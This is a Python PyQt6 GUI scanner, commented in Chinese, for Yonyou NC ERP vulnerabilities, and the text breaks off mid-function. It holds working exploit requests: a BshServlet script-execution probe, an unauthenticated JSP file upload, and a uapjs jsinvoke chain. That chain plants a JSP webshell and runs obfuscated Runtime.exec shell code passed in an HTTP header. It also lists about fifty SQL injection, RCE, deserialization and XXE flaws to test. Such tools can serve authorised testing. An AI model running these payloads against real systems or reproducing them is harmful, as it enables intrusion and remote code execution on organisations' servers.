import sys
import os
import datetime
import requests
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QTabWidget,
    QLabel, QPushButton, QLineEdit, QTextEdit, QMessageBox, QComboBox,
    QGroupBox, QGridLayout, QSplitter
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QDateTime
from PyQt6.QtGui import QFont, QTextCursor, QIcon


class LogThread(QThread):
    """日志线程，用于在GUI线程外处理日志记录"""
    log_signal = pyqtSignal(str)

    def run(self):
        # 此线程用于处理日志记录，实际使用时可以在这里添加日志处理逻辑
        pass


class ScanThread(QThread):
    """扫描线程，用于在后台执行漏洞检测和利用任务"""
    result_signal = pyqtSignal(str)
    log_signal = pyqtSignal(str)

    def __init__(self, target, proxy=None, scan_type='detect'):
        super().__init__()
        self.target = target
        self.proxy = proxy
        self.scan_type = scan_type

    def run(self):
        try:
            # 根据扫描类型执行不同的操作
            if self.scan_type == 'detect':
                self._run_detection()
            else:
                self._run_exploitation()
        except Exception as e:
            error_msg = f'扫描过程中发生错误: {str(e)}'
            self.log_signal.emit(error_msg)
            self.result_signal.emit(f'失败: {error_msg}')

    def _check_bsh_servlet(self):
        """检测BshServlet命令执行漏洞"""
        try:
            # 从目标URL中提取域名或IP加上端口
            import re
            target_url = self.target.rstrip('/')
            # 提取域名/IP和端口
            match = re.match(r'(https?://)?([^:/]+)(:([0-9]+))?', target_url)
            if not match:
                raise ValueError('无效的目标URL')
            
            scheme = match.group(1) or 'http://'
            host = match.group(2)
            port = match.group(4) or ('443' if scheme == 'https://' else '80')
            
            # 构建请求URL
            base_url = f"{scheme}{host}:{port}"
            exploit_url = f"{base_url}/servlet/~ic/bsh.servlet.BshServlet"
            
            self.log_signal.emit(f'正在检测 BshServlet 命令执行漏洞...')
            
            # 构建请求头
            headers = {
                'Host': f'{host}:{port}',
                'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
                'User-Agent': 'Mozilla/5.0 (compatible; Baiduspider/2.0; + http://www.baidu.com/search/spider.html)',
                'Connection': 'keep-alive',
                'Accept-Encoding': 'gzip, deflate, br'
            }
            
            # 构建请求体
            data = 'bsh.script=print("bshservlet0check");'
            
            # 发送请求
            response = requests.post(exploit_url, headers=headers, data=data, proxies=self.proxy, timeout=10, verify=False)
            
            # 检查响应
            if response.status_code == 200 and 'bshservlet0check' in response.text:
                result = f'漏洞检测结果: {target_url} 存在 BshServlet 命令执行漏洞！'
                self.log_signal.emit('漏洞检测发现: 目标存在BshServlet命令执行漏洞')
            else:
                result = f'漏洞检测结果: {target_url} 未检测到 BshServlet 命令执行漏洞'
                self.log_signal.emit(f'漏洞检测结果: 未发现BshServlet命令执行漏洞')
            
            return result
        except Exception as e:
            error_msg = f'BshServlet漏洞检测错误: {str(e)}'
            self.log_signal.emit(error_msg)
            return f'漏洞检测结果: BshServlet命令执行漏洞检测失败 - {error_msg}'

    def _check_grouptemplet_upload(self):
        """检测grouptemplet文件上传漏洞"""
        try:
            # 从目标URL中提取域名或IP加上端口
            import re
            target_url = self.target.rstrip('/')
            # 提取域名/IP和端口
            match = re.match(r'(https?://)?([^:/]+)(:([0-9]+))?', target_url)
            if not match:
                raise ValueError('无效的目标URL')
            
            scheme = match.group(1) or 'http://'
            host = match.group(2)
            port = match.group(4) or ('443' if scheme == 'https://' else '80')
            
            # 构建请求URL
            base_url = f"{scheme}{host}:{port}"
            exploit_url = f"{base_url}/uapim/upload/grouptemplet?groupid=nc&fileType=jsp&maxSize=999"
            
            self.log_signal.emit(f'正在检测 grouptemplet 文件上传漏洞...')
            
            # 构建multipart/form-data请求
            boundary = '----WebKitFormBoundaryEXmnamw5gVZG9KAQ'
            headers = {
                'Host': f'{host}:{port}',
                'Content-Type': f'multipart/form-data; boundary={boundary}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
            }
            
            # 构建请求体
            body = [
                f'--{boundary}',
                'Content-Disposition: form-data; name="file"; filename="xxx.jsp"',
                'Content-Type: application/octet-stream',
                '',
                'hello Nc',
                f'--{boundary}--'
            ]
            data = '\r\n'.join(body)
            
            # 发送请求
            response = requests.post(exploit_url, headers=headers, data=data, proxies=self.proxy, timeout=10, verify=False)
            
            # 检查响应
            # 尝试访问可能上传的文件
            verify_url = f"{base_url}/uapim/static/pages/nc/xxx.jsp"
            try:
                # 添加User-Agent头
                verify_headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
                }
                verify_response = requests.get(verify_url, headers=verify_headers, proxies=self.proxy, timeout=10, verify=False)
                
                # 检查响应状态码和内容
                if verify_response.status_code == 200 and 'hello Nc' in verify_response.text:
                    result = f'漏洞检测结果: {target_url} 存在 grouptemplet 文件上传漏洞！\n文件已成功上传并可访问: {verify_url}'
                    self.log_signal.emit('漏洞检测发现: 目标存在grouptemplet文件上传漏洞')
                else:
                    result = f'漏洞检测结果: {target_url} 未检测到 grouptemplet 文件上传漏洞'
                    self.log_signal.emit(f'漏洞检测结果: 未发现grouptemplet文件上传漏洞')
            except Exception as e:
                result = f'漏洞检测结果: {target_url} 未检测到 grouptemplet 文件上传漏洞'
                self.log_signal.emit(f'漏洞检测结果: 未发现grouptemplet文件上传漏洞')
            
            return result
        except Exception as e:
            error_msg = f'grouptemplet文件上传漏洞检测错误: {str(e)}'
            self.log_signal.emit(error_msg)
            return f'漏洞检测结果: grouptemplet文件上传漏洞检测失败 - {error_msg}'

    def _check_uapjs_command_execution(self):
        """检测uapjs命令执行漏洞"""
        try:
            # 从目标URL中提取域名或IP加上端口
            import re
            target_url = self.target.rstrip('/')
            # 提取域名/IP和端口
            match = re.match(r'(https?://)?([^:/]+)(:([0-9]+))?', target_url)
            if not match:
                raise ValueError('无效的目标URL')
            
            scheme = match.group(1) or 'http://'
            host = match.group(2)
            port = match.group(4) or ('443' if scheme == 'https://' else '80')
            
            # 构建请求URL
            base_url = f"{scheme}{host}:{port}"
            exploit_url = f"{base_url}/uapjs/jsinvoke/?action=invoke"
            
            self.log_signal.emit(f'正在检测 uapjs 命令执行漏洞...')
            
            # 构建请求头
            headers = {
                'Host': f'{host}:{port}',
                'Content-Type': 'application/json; charset=utf-8',
                'User-Agent': 'Mozilla/5.0 (compatible; Baiduspider/2.0; + http://www.baidu.com/search/spider.html)',
                'Connection': 'keep-alive',
                'Accept-Encoding': 'gzip, deflate, br'
            }
            
            # 构建请求体
            payload = {
                "serviceName": "nc.itf.iufo.IBaseSPService",
                "methodName": "saveXStreamConfig",
                "parameterTypes": [
                    "java.lang.Object",
                    "java.lang.String"
                ],
                "parameters": [
                    "${param[param.l]()[param.a](param.b)[param.c]()[param.d](param.e)[param.f](header.UmgnUQapJZ)}",
                    "webapps/nc_web/.UmgnUQapJZ.jsp"
                ]
            }
            
            # 发送第一个请求
            response = requests.post(exploit_url, headers=headers, json=payload, proxies=self.proxy, timeout=10, verify=False)
            
            # 构建第二个请求URL
            check_url = f"{base_url}/.UmgnUQapJZ.jsp"
            
            # 构建第二个请求头
            check_headers = {
                'Host': f'{host}:{port}',
                'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
                'User-Agent': 'Mozilla/5.0 (compatible; Baiduspider/2.0; + http://www.baidu.com/search/spider.html)',
                'Connection': 'keep-alive',
                'Accept-Encoding': 'gzip, deflate, br',
                'UmgnUQapJZ': 'var s = [7];s[0] = \'c\'+\'m\'+\'d\';s[1] =\'/c\';s[2] = \'"e\'+\'c\'+\'h\'+\'o\'+\' \'+\'UmgnUQapJZ"\';s[3] = \'|\'+\'|\';s[4] = \'b\'+\'a\'+\'s\'+\'h\';s[5] = \'-c\';s[6] = \'"e\'+\'c\'+\'h\'+\'o\'+\' \'+\'UmgnUQapJZ"\';var p =java.lang.Runtime.getRuntime().\u0065\u0078\u0065\u0063(s);var sc = new java.util.Scanner(p.\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d(),"GBK").useDelimiter(\'\\A\');var result = sc.hasNext() ? sc.next() : \'\';sc.close();result;'
            }
            
            # 构建第二个请求体
            check_data = 'l=getClass&a=forName&b=javax.script.ScriptEngineManager&c=newInstance&d=getEngineByName&e=js&f=eval'
            
            # 发送第二个请求
            check_response = requests.post(check_url, headers=check_headers, data=check_data, proxies=self.proxy, timeout=10, verify=False)
            
            # 检查响应
            if check_response.status_code == 200 and 'UmgnUQapJZ' in check_response.text:
                result = f'漏洞检测结果: {target_url} 存在 uapjs 命令执行漏洞！'
                self.log_signal.emit('漏洞检测发现: 目标存在uapjs命令执行漏洞')
            else:
                result = f'漏洞检测结果: {target_url} 未检测到 uapjs 命令执行漏洞'
                self.log_signal.emit(f'漏洞检测结果: 未发现uapjs命令执行漏洞')
            
            return result
        except Exception as e:
            error_msg = f'uapjs命令执行漏洞检测错误: {str(e)}'
            self.log_signal.emit(error_msg)
            return f'漏洞检测结果: uapjs命令执行漏洞检测失败 - {error_msg}'

    def _check_poc(self, vuln_name, poc_content):
        """通用POC检测方法，执行POC请求并检查响应"""
        try:
            target_url = self.target.rstrip('/')
            
            # 从目标URL中提取域名或IP加上端口
            import re
            match = re.match(r'(https?://)?([^:/]+)(:([0-9]+))?', target_url)
            if not match:
                raise ValueError('无效的目标URL')
            
            scheme = match.group(1) or 'http://'
            host = match.group(2)
            port = match.group(4) or ('443' if scheme == 'https://' else '80')
            base_url = f"{scheme}{host}:{port}"
            
            # 解析POC内容
            # 提取请求方法和路径
            method_match = re.search(r'(GET|POST|PUT|DELETE|HEAD)\s+(.*?)\s+HTTP', poc_content)
            if not method_match:
                # 尝试简单匹配URL路径
                path_match = re.search(r'(?:GET|POST|PUT|DELETE|HEAD)?\s*(/[^\s]+)', poc_content)
                if not path_match:
                    return f'漏洞检测结果: {vuln_name} POC解析失败，无法提取请求路径'
                
                method = 'GET'
                path = path_match.group(1)
            else:
                method = method_match.group(1)
                path = method_match.group(2)
            
            # 构建完整的请求URL
            if path.startswith('http'):
                request_url = path
            else:
                # 确保base_url末尾没有斜杠，path开头有斜杠
                clean_base_url = base_url.rstrip('/')
                clean_path = path if path.startswith('/') else f'/{path}'
                request_url = f"{clean_base_url}{clean_path}"
                
                # 记录构建的请求URL用于调试
                self.log_signal.emit(f'构建的请求URL: {request_url}')
            
            # 提取请求头
            headers = {}
            # 修正：使用更可靠的正则表达式解析请求头
            headers_block_match = re.search(r'^.*\n(.*?)\n\n', poc_content, re.DOTALL)
            if headers_block_match:
                headers_section = headers_block_match.group(1)
                for line in headers_section.split('\n'):
                    if ':' in line:
                        key, value = line.split(':', 1)
                        headers[key.strip()] = value.strip()
            
            # 更新Host头
            if 'Host' not in headers:
                headers['Host'] = f"{host}:{port}"
            
            # 添加User-Agent头如果不存在
            if 'User-Agent' not in headers:
                headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
            
            # 提取请求体
            body_match = re.search(r'\n\n(.*)', poc_content, re.DOTALL)
            data = body_match.group(1).strip() if body_match else None
            
            self.log_signal.emit(f'正在检测 {vuln_name}...')
            
            # 发送请求 (简化为使用 requests.request)
            response = requests.request(method, request_url, headers=headers, data=data, proxies=self.proxy, timeout=10, verify=False)
            
            # 解析验证规则
            verification_match = re.search(r'## verification\n```\n((?:.|\n)*?)\n```', poc_content)
            if verification_match:
                verification_rules = verification_match.group(1).strip()
                rules = dict(re.findall(r'(\w+):\s*(.*)', verification_rules))
                
                status_code_ok = 'status_code' not in rules or response.status_code == int(rules['status_code'])
                body_contains_ok = 'body_contains' not in rules or rules['body_contains'] in response.text
                
                if status_code_ok and body_contains_ok:
                    result = f'漏洞检测结果: {target_url} 存在 {vuln_name}！'
                    self.log_signal.emit(f'漏洞检测发现: 目标存在{vuln_name}')
                else:
                    result = f'漏洞检测结果: {target_url} 未检测到 {vuln_name} (验证失败)'
                    self.log_signal.emit(f'漏洞检测结果: 未发现{vuln_name}')
            else:
                # 保持向后兼容
                if response.status_code == 200:
                    result = f'漏洞检测结果: {target_url} 可能存在 {vuln_name}！(仅检查状态码200)'
                    self.log_signal.emit(f'漏洞检测发现: 目标可能存在{vuln_name}')
                else:
                    result = f'漏洞检测结果: {target_url} 未检测到 {vuln_name} (返回状态码{response.status_code})'
                    self.log_signal.emit(f'漏洞检测结果: 未发现{vuln_name}')
            
            return result
        except Exception as e:
            error_msg = f'{vuln_name}检测错误: {str(e)}'
            self.log_signal.emit(error_msg)
            return f'漏洞检测结果: {vuln_name}检测失败 - {error_msg}'
    
    def _run_detection(self):
        """运行漏洞检测"""
        self.log_signal.emit(f'开始漏洞检测: {self.target}')
        
        try:
            # 获取主窗口的漏洞类型选择
            main_window = QApplication.activeWindow()
            vuln_type = "全部"
            if main_window and hasattr(main_window, 'vuln_type'):
                vuln_type = main_window.vuln_type.currentText()
            
            results = []
            
            # 已实现的特殊漏洞检测
            implemented_vulns = {
                'BshServlet命令执行': self._check_bsh_servlet,
                'grouptemplet 文件上传': self._check_grouptemplet_upload,
                'uapjs 命令执行': self._check_uapjs_command_execution
            }
            
            # 根据选择的漏洞类型执行检测
            if vuln_type == '全部':
                # 执行所有已实现的特殊漏洞检测
                for vuln_name, check_func in implemented_vulns.items():
                    result = check_func()
                    results.append(result)
                
                # 对于下拉框中除了已实现和'全部'之外的所有漏洞，尝试使用POC文件进行检测
                if main_window and hasattr(main_window, 'vuln_type'):
                    for i in range(main_window.vuln_type.count()):
                        current_vuln = main_window.vuln_type.itemText(i)
                        if current_vuln not in implemented_vulns and current_vuln != '全部':
                            # 构建POC文件路径
                            poc_file = os.path.join('POCs', f'{current_vuln}.md')
                            if os.path.exists(poc_file):
                                try:
                                    with open(poc_file, 'r', encoding='utf-8') as f:
                                        poc_content = f.read()
                                    poc_result = self._check_poc(current_vuln, poc_content)
                                    results.append(poc_result)
                                except Exception as e:
                                    results.append(f'漏洞检测结果: 读取{current_vuln}的POC文件失败 - {str(e)}')
            else:
                # 执行单个漏洞检测
                if vuln_type in implemented_vulns:
                    # 使用已实现的特殊检测函数
                    result = implemented_vulns[vuln_type]()
                    results.append(result)
                else:
                    # 尝试使用POC文件进行检测
                    poc_file = os.path.join('POCs', f'{vuln_type}.md')
                    if os.path.exists(poc_file):
                        try:
                            with open(poc_file, 'r', encoding='utf-8') as f:
                                poc_content = f.read()
                            poc_result = self._check_poc(vuln_type, poc_content)
                            results.append(poc_result)
                        except Exception as e:
                            results.append(f'漏洞检测结果: 读取{vuln_type}的POC文件失败 - {str(e)}')
                    else:
                        results.append(f'漏洞检测结果: {vuln_type} 的POC文件不存在')
            
            # 将所有结果合并并发送
            final_result = '\n\n'.join(results)
            self.result_signal.emit(final_result)
        except Exception as e:
            error_msg = f'扫描过程中发生错误: {str(e)}'
            self.log_signal.emit(error_msg)
            self.result_signal.emit(f'漏洞检测结果: 检测失败 - {error_msg}')
        
        self.log_signal.emit(f'漏洞检测完成: {self.target}')

    def _run_exploitation(self):
        """运行漏洞利用"""
        self.log_signal.emit(f'开始漏洞利用: {self.target}')
        
        # 这里是漏洞利用的模拟代码
        # 实际应用中，这里会调用具体的EXP利用逻辑
        
        # 模拟网络请求延迟
        self.msleep(1500)
        
        # 模拟利用结果
        self.log_signal.emit(f'漏洞利用完成: {self.target}')
        self.result_signal.emit(f'漏洞利用结果: 目标 {self.target} 利用完成 (模拟结果)')


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.init_ui()
        self.setup_threads()

    def init_ui(self):
        # 设置窗口属性
        self.setWindowTitle('用友 NC 漏洞检测工具')
        self.setMinimumSize(1000, 700)
        
        # 创建中央部件和布局
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        
        # 创建标题标签
        title_label = QLabel('用友 NC 漏洞检测工具')
        title_font = QFont()
        title_font.setPointSize(18)
        title_font.setBold(True)
        title_label.setFont(title_font)
        title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        main_layout.addWidget(title_label)
        
        # 创建全局目标URL输入框
        target_group = QGroupBox('目标设置')
        target_layout = QHBoxLayout()
        target_layout.addWidget(QLabel('目标URL:'))
        self.global_target = QLineEdit()
        self.global_target.setPlaceholderText('https://example.com')
        target_layout.addWidget(self.global_target)
        target_group.setLayout(target_layout)
        main_layout.addWidget(target_group)
        
        # 创建代理设置区域
        self.create_proxy_settings(main_layout)
        
        # 创建功能选项卡
        self.create_tabs(main_layout)
        
        # 创建日志区域
        self.create_log_area(main_layout)
        
        # 创建状态栏
        self.statusBar().showMessage('就绪')

    def create_proxy_settings(self, parent_layout):
        """创建代理设置区域"""
        proxy_group = QGroupBox('代理设置')
        proxy_layout = QGridLayout()
        
        # 代理类型选择
        proxy_layout.addWidget(QLabel('代理类型:'), 0, 0)
        self.proxy_type = QComboBox()
        self.proxy_type.addItems(['无代理', 'HTTP', 'SOCKS5'])
        self.proxy_type.currentIndexChanged.connect(self.on_proxy_type_changed)
        proxy_layout.addWidget(self.proxy_type, 0, 1)
        
        # 代理服务器地址
        proxy_layout.addWidget(QLabel('代理服务器:'), 1, 0)
        self.proxy_host = QLineEdit()
        self.proxy_host.setPlaceholderText('127.0.0.1')
        self.proxy_host.setEnabled(False)
        proxy_layout.addWidget(self.proxy_host, 1, 1)
        
        # 代理端口
        proxy_layout.addWidget(QLabel('端口:'), 1, 2)
        self.proxy_port = QLineEdit()
        self.proxy_port.setPlaceholderText('8080')
        self.proxy_port.setEnabled(False)
        proxy_layout.addWidget(self.proxy_port, 1, 3)
        
        # 用户名和密码（可选）
        proxy_layout.addWidget(QLabel('用户名:'), 2, 0)
        self.proxy_user = QLineEdit()
        self.proxy_user.setEnabled(False)
        proxy_layout.addWidget(self.proxy_user, 2, 1)
        
        proxy_layout.addWidget(QLabel('密码:'), 2, 2)
        self.proxy_pass = QLineEdit()
        self.proxy_pass.setEchoMode(QLineEdit.EchoMode.Password)
        self.proxy_pass.setEnabled(False)
        proxy_layout.addWidget(self.proxy_pass, 2, 3)
        
        # 应用代理按钮
        self.apply_proxy_btn = QPushButton('应用代理')
        self.apply_proxy_btn.setEnabled(False)
        self.apply_proxy_btn.clicked.connect(self.apply_proxy)
        proxy_layout.addWidget(self.apply_proxy_btn, 3, 0, 1, 4)
        
        proxy_group.setLayout(proxy_layout)
        parent_layout.addWidget(proxy_group)

    def on_proxy_type_changed(self, index):
        """当代理类型改变时启用或禁用相关输入框"""
        is_enabled = index > 0  # 0 表示无代理
        self.proxy_host.setEnabled(is_enabled)
        self.proxy_port.setEnabled(is_enabled)
        self.proxy_user.setEnabled(is_enabled)
        self.proxy_pass.setEnabled(is_enabled)
        self.apply_proxy_btn.setEnabled(is_enabled)

    def apply_proxy(self):
        """应用代理设置"""
        try:
            proxy_type = self.proxy_type.currentText()
            if proxy_type == '无代理':
                self.current_proxy = None
                self.log_message('已禁用代理')
                return
            
            host = self.proxy_host.text().strip()
            port = self.proxy_port.text().strip()
            
            if not host or not port:
                QMessageBox.warning(self, '警告', '请填写完整的代理服务器地址和端口')
                return
            
            try:
                port = int(port)
                if port < 1 or port > 65535:
                    raise ValueError('端口号必须在1-65535之间')
            except ValueError:
                QMessageBox.warning(self, '警告', '端口号必须是有效的数字')
                return
            
            user = self.proxy_user.text().strip()
            password = self.proxy_pass.text().strip()
            
            # 构建代理URL
            if user and password:
                proxy_url = f'{proxy_type.lower()}://{user}:{password}@{host}:{port}'
            else:
                proxy_url = f'{proxy_type.lower()}://{host}:{port}'
            
            self.current_proxy = {
                'http': proxy_url,
                'https': proxy_url
            }
            
            # 禁用代理设置编辑功能区
            self.proxy_type.setEnabled(False)
            self.proxy_host.setEnabled(False)
            self.proxy_port.setEnabled(False)
            self.proxy_user.setEnabled(False)
            self.proxy_pass.setEnabled(False)
            
            # 更改按钮文本和连接的槽函数
            self.apply_proxy_btn.setText('停止代理')
            # 具体断开与apply_proxy方法的连接
            try:
                self.apply_proxy_btn.clicked.disconnect(self.apply_proxy)
            except TypeError:
                # 如果没有连接，忽略错误
                pass
            self.apply_proxy_btn.clicked.connect(self.stop_proxy)
            
            self.log_message(f'已应用{proxy_type}代理: {host}:{port}')
            self.statusBar().showMessage(f'已应用{proxy_type}代理')
        except Exception as e:
            QMessageBox.critical(self, '错误', f'应用代理失败: {str(e)}')
    
    def stop_proxy(self):
        """停止代理设置"""
        # 清除代理设置
        self.current_proxy = None
        
        # 恢复代理设置编辑功能区
        self.proxy_type.setEnabled(True)
        # 根据当前代理类型决定是否启用其他输入框
        is_enabled = self.proxy_type.currentIndex() > 0
        self.proxy_host.setEnabled(is_enabled)
        self.proxy_port.setEnabled(is_enabled)
        self.proxy_user.setEnabled(is_enabled)
        self.proxy_pass.setEnabled(is_enabled)
        
        # 更改按钮文本和连接的槽函数
        self.apply_proxy_btn.setText('应用代理')
        # 具体断开与stop_proxy方法的连接
        try:
            self.apply_proxy_btn.clicked.disconnect(self.stop_proxy)
        except TypeError:
            # 如果没有连接，忽略错误
            pass
        self.apply_proxy_btn.clicked.connect(self.apply_proxy)
        
        self.log_message('已停止代理')
        self.statusBar().showMessage('已停止代理')

    def create_tabs(self, parent_layout):
        """创建功能选项卡"""
        self.tabs = QTabWidget()
        
        # 创建漏洞检测选项卡
        self.detect_tab = QWidget()
        self.create_detect_tab()
        self.tabs.addTab(self.detect_tab, '漏洞检测')
        
        # 创建漏洞利用选项卡
        self.exploit_tab = QWidget()
        self.create_exploit_tab()
        self.tabs.addTab(self.exploit_tab, '漏洞利用')
        
        parent_layout.addWidget(self.tabs)

    def create_detect_tab(self):
        """创建漏洞检测选项卡"""
        layout = QVBoxLayout(self.detect_tab)
        
        # 漏洞选项选择
        vuln_layout = QHBoxLayout()
        vuln_layout.addWidget(QLabel('漏洞选项:'))
        self.vuln_type = QComboBox()
        self.vuln_type.addItems([
            '全部', 
            'BshServlet命令执行', 
            'grouptemplet 文件上传', 
            'uapjs 命令执行',
            '用友NC word.docx任意文件读取漏洞',
            '用友NC-ActionServlet存在SQL注入漏洞',
            '用友NC-Cloud uploadChunk 任意文件上传漏洞',
            '用友NC-Cloud_importhttpscer接口存在任意文件上传漏洞',
            '用友NC-Cloud接口blobRefClassSearch存在反序列化漏洞',
            '用友NC-Cloud文件服务器用户登陆绕过漏洞',
            '用友NC-Cloud系统queryPsnInfo存在SQL注入漏洞',
            '用友NC-Cloud系统queryStaffByName存在SQL注入漏洞',
            '用友NC-Cloud系统show_download_content接口存在SQL注入漏洞',
            '用友NC-Cloud系统接口getStaffInfo存在SQL注入漏洞',
            '用友NC-avatar接口存在文件上传漏洞',
            '用友NC-bill存在SQL注入漏洞',
            '用友NC-cartabletimeline存在SQL注入漏洞',
            '用友NC-complainbilldetail存在SQL注入漏洞',
            '用友NC-downCourseWare任意文件读取',
            '用友NC-downTax存在SQL注入漏洞',
            '用友NC-oacoSchedulerEvents接口存在sql注入漏洞',
            '用友NC-pagesServlet存在SQL注入',
            '用友NC-process存在SQL注入漏洞',
            '用友NC-runStateServlet接口存在SQL注入漏洞',
            '用友NC-saveDoc.ajax存在任意文件上传漏洞',
            '用友NC-showcontent接口存在sql注入漏洞',
            '用友NC-uploadControl接口存在文件上传漏洞',
            '用友NC-warningDetailInfo接口存在SQL注入漏洞',
            '用友NC-workflowImageServlet接口存在sql注入漏洞',
            '用友NCCloud系统runScript存在SQL注入漏洞',
            '用友NC_CLOUD_smartweb2.RPC.d_XML外部实体注入',
            '用友NC_Cloud_soapFormat.ajax接口存在XXE',
            '用友NC_saveImageServlet接口存在文件上传漏洞',
            '用友NC及U8cloud系统接口LoggingConfigServlet存在反序列化漏洞(XVE-2024-18151)',
            '用友NC接口ConfigResourceServlet存在反序列漏洞',
            '用友NC接口PaWfm存在sql注入漏洞',
            '用友NC接口download存在SQL注入漏洞',
            '用友NC接口saveXmlToFIleServlet存在文件上传',
            '用友NC的download文件存在任意文件读取漏洞',
            '用友NC系统FileManager接口存在任意文件上传漏洞',
            '用友NC系统complainjudge接口SQL注入漏洞(XVE-2024-19043)',
            '用友NC系统linkVoucher存在sql注入漏洞',
            '用友NC系统printBill接口存在任意文件读取漏洞',
            '用友NC系统querygoodsgridbycode接口code参数存在SQL注入漏洞',
            '用友NC系统registerServlet接口存在JNDI注入漏洞',
            '用友NC系统word.docx存在信息泄露漏洞',
            '用友NC系统接口UserAuthenticationServlet存在反序列化RCE漏洞(XVE-2024-18302)',
            '用友NC系统接口link存在SQL注入漏洞',
            '用友NC系统接口yerfile_down存在SQL注入漏洞',
            '用友nc-cloud RCE',
            '用友nc电子采购信息系统securitycheck存在sql注入'
        ])
        vuln_layout.addWidget(self.vuln_type)
        layout.addLayout(vuln_layout)
        
        # 扫描按钮
        button_layout = QHBoxLayout()
        self.start_detect_btn = QPushButton('开始检测')
        self.start_detect_btn.clicked.connect(self.start_detection)
        button_layout.addWidget(self.start_detect_btn)
        layout.addLayout(button_layout)
        
        # 检测结果
        layout.addWidget(QLabel('检测结果:'))
        self.detect_result = QTextEdit()
        self.detect_result.setReadOnly(True)
        layout.addWidget(self.detect_result)

    def create_exploit_tab(self):
        """创建漏洞利用选项卡"""
        layout = QVBoxLayout(self.exploit_tab)
        
        # 漏洞选项选择
        vuln_layout = QHBoxLayout()
        vuln_layout.addWidget(QLabel('漏洞选项:'))
        self.exploit_vuln = QComboBox()
        self.exploit_vuln.addItems([
            '请选择漏洞',
            'BshServlet命令执行', 
            'grouptemplet 文件上传', 
            'uapjs 命令执行',
            '用友NC word.docx任意文件读取漏洞',
            '用友NC-ActionServlet存在SQL注入漏洞',
            '用友NC-Cloud uploadChunk 任意文件上传漏洞',
            '用友NC-Cloud_importhttpscer接口存在任意文件上传漏洞',
            '用友NC-Cloud接口blobRefClassSearch存在反序列化漏洞',
            '用友NC-Cloud文件服务器用户登陆绕过漏洞',
            '用友NC-Cloud系统queryPsnInfo存在SQL注入漏洞',
            '用友NC-Cloud系统queryStaffByName存在SQL注入漏洞',
            '用友NC-Cloud系统show_download_content接口存在SQL注入漏洞',
            '用友NC-Cloud系统接口getStaffInfo存在SQL注入漏洞',
            '用友NC-avatar接口存在文件上传漏洞',
            '用友NC-bill存在SQL注入漏洞',
            '用友NC-cartabletimeline存在SQL注入漏洞',
            '用友NC-complainbilldetail存在SQL注入漏洞',
            '用友NC-downCourseWare任意文件读取',
            '用友NC-downTax存在SQL注入漏洞',
            '用友NC-oacoSchedulerEvents接口存在sql注入漏洞',
            '用友NC-pagesServlet存在SQL注入',
            '用友NC-process存在SQL注入漏洞',
            '用友NC-runStateServlet接口存在SQL注入漏洞',
            '用友NC-saveDoc.ajax存在任意文件上传漏洞',
            '用友NC-showcontent接口存在sql注入漏洞',
            '用友NC-uploadControl接口存在文件上传漏洞',
            '用友NC-warningDetailInfo接口存在SQL注入漏洞',
            '用友NC-workflowImageServlet接口存在sql注入漏洞',
            '用友NCCloud系统runScript存在SQL注入漏洞',
            '用友NC_CLOUD_smartweb2.RPC.d_XML外部实体注入',
            '用友NC_Cloud_soapFormat.ajax接口存在XXE',
            '用友NC_saveImageServlet接口存在文件上传漏洞',
            '用友NC及U8cloud系统接口LoggingConfigServlet存在反序列化漏洞(XVE-2024-18151)',
            '用友NC接口ConfigResourceServlet存在反序列漏洞',
            '用友NC接口PaWfm存在sql注入漏洞',
            '用友NC接口download存在SQL注入漏洞',
            '用友NC接口saveXmlToFIleServlet存在文件上传',
            '用友NC的download文件存在任意文件读取漏洞',
            '用友NC系统FileManager接口存在任意文件上传漏洞',
            '用友NC系统complainjudge接口SQL注入漏洞(XVE-2024-19043)',
            '用友NC系统linkVoucher存在sql注入漏洞',
            '用友NC系统printBill接口存在任意文件读取漏洞',
            '用友NC系统querygoodsgridbycode接口code参数存在SQL注入漏洞',
            '用友NC系统registerServlet接口存在JNDI注入漏洞',
            '用友NC系统word.docx存在信息泄露漏洞',
            '用友NC系统接口UserAuthenticationServlet存在反序列化RCE漏洞(XVE-2024-18302)',
            '用友NC系统接口link存在SQL注入漏洞',
            '用友NC系统接口yerfile_down存在SQL注入漏洞',
            '用友nc-cloud RCE',
            '用友nc电子采购信息系统securitycheck存在sql注入'
        ])
        vuln_layout.addWidget(self.exploit_vuln)
        layout.addLayout(vuln_layout)
        
        # 利用按钮
        button_layout = QHBoxLayout()
        self.start_exploit_btn = QPushButton('开始利用')
        self.start_exploit_btn.clicked.connect(self.start_exploitation)
        button_layout.addWidget(self.start_exploit_btn)
        layout.addLayout(button_layout)
        
        # 利用结果
        layout.addWidget(QLabel('利用结果:'))
        self.exploit_result = QTextEdit()
        self.exploit_result.setReadOnly(True)
        layout.addWidget(self.exploit_result)

    def create_log_area(self, parent_layout):
        """创建日志显示区域"""
        log_group = QGroupBox('操作日志')
        log_layout = QVBoxLayout()
        
        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        log_layout.addWidget(self.log_text)
        
        # 日志控制按钮
        log_buttons = QHBoxLayout()
        self.clear_log_btn = QPushButton('清除日志')
        self.clear_log_btn.clicked.connect(self.clear_log)
        log_buttons.addWidget(self.clear_log_btn)
        
        log_layout.addLayout(log_buttons)
        log_group.setLayout(log_layout)
        
        # 设置日志区域为可伸缩
        parent_layout.addWidget(log_group, 1)

    def setup_threads(self):
        """设置线程"""
        # 初始化代理设置
        self.current_proxy = None
        
        # 初始化扫描线程
        self.scan_thread = None

    def start_detection(self):
        """开始漏洞检测"""
        target = self.global_target.text().strip()
        if not target:
            QMessageBox.warning(self, '警告', '请输入目标URL')
            return
        
